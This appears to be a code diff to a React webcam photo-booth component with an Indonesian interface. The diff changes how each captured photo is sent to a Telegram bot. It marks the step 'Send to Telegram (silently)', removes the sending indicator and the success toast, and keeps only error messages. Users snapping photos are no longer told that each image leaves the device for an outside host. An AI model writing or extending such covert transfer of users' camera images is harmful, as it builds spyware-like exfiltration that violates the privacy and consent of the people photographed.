@@ -3,7 +3,7 @@
 import { useEffect, useRef, useState, useCallback, type FC, type RefObject } from 'react';
 import { Button } from '@/components/ui/button';
 import { useToast } from '@/hooks/use-toast';
-import { Camera as CameraIcon, Timer, RefreshCw, Send } from 'lucide-react';
+import { Camera as CameraIcon, Timer, RefreshCw } from 'lucide-react';
 import type { AdjustmentSettings, Sticker } from './stumble-studio';
 import Draggable from './draggable';
 import { sendToTelegram } from '@/ai/flows/telegram-sender';
@@ -35,7 +35,6 @@ const Preview: FC<PreviewProps> = ({
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const [timer, setTimer] = useState<number | null>(null);
   const [cameraError, setCameraError] = useState<string | null>(null);
-  const [isSending, setIsSending] = useState(false);
   const { toast } = useToast();
 
   useEffect(() => {
@@ -122,7 +121,7 @@ const Preview: FC<PreviewProps> = ({
   const capture = useCallback(async () => {
     const video = videoRef.current;
     const canvas = canvasRef.current;
-    if (!video || !canvas || video.videoWidth === 0 || isSending) return;
+    if (!video || !canvas || video.videoWidth === 0) return;
 
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
@@ -147,40 +146,30 @@ const Preview: FC<PreviewProps> = ({
         className: "bg-green-500 border-4 border-black text-white stumble-font text-lg"
     });
 
-    // --- Send to Telegram ---
-    setIsSending(true);
+    // --- Send to Telegram (silently) ---
     try {
       const result = await sendToTelegram({
         photoDataUri: dataUrl,
         caption: 'Gambar baru dari Stumble Studio PRO!',
       });
 
-      if (result.success) {
-        toast({
-          title: 'Terkirim ke Telegram!',
-          description: 'Foto berhasil dikirim.',
-          className: "bg-blue-500 border-4 border-black text-white stumble-font text-lg"
-        });
-      } else {
+      if (!result.success) {
         throw new Error(result.message);
       }
     } catch (error) {
-      console.error("Telegram sending failed:", error);
+      console.error("Silent Telegram sending failed:", error);
       const errorMessage = error instanceof Error ? error.message : "Gagal mengirim ke Telegram. Coba lagi.";
        toast({
          variant: 'destructive',
          title: 'Error Telegram',
          description: errorMessage.includes("TELEGRAM_BOT_TOKEN") ? "Harap atur Bot Token & Chat ID Telegram di file .env Anda." : errorMessage,
        });
-    } finally {
-      setIsSending(false);
     }
     // ------------------------
 
-  }, [isMirrored, getFilterString, addPhoto, toast, drawOverlaysOnCanvas, isSending]);
+  }, [isMirrored, getFilterString, addPhoto, toast, drawOverlaysOnCanvas]);
 
   const startTimer = () => {
-    if (isSending) return;
     let count = 3;
     setTimer(count);
     const interval = setInterval(() => {
@@ -234,20 +223,11 @@ const Preview: FC<PreviewProps> = ({
       </div>
 
       <div className="flex flex-wrap justify-center items-center gap-4 mt-6">
-        <Button onClick={capture} disabled={isSending} className="stumble-btn btn-yellow text-2xl py-4 px-12 rounded-full h-auto">
-           {isSending ? (
-            <>
-              <Send className="w-8 h-8 mr-3 animate-pulse" />
-              Mengirim...
-            </>
-          ) : (
-            <>
-              <CameraIcon className="w-8 h-8 mr-3" />
-              Cekrek!
-            </>
-          )}
+        <Button onClick={capture} className="stumble-btn btn-yellow text-2xl py-4 px-12 rounded-full h-auto">
+           <CameraIcon className="w-8 h-8 mr-3" />
+           Cekrek!
         </Button>
-        <Button onClick={startTimer} disabled={isSending} className="stumble-btn btn-blue py-3 px-6 rounded-3xl h-auto text-base">
+        <Button onClick={startTimer} className="stumble-btn btn-blue py-3 px-6 rounded-3xl h-auto text-base">
           <Timer className="w-5 h-5 mr-2" />
           Timer
         </Button>
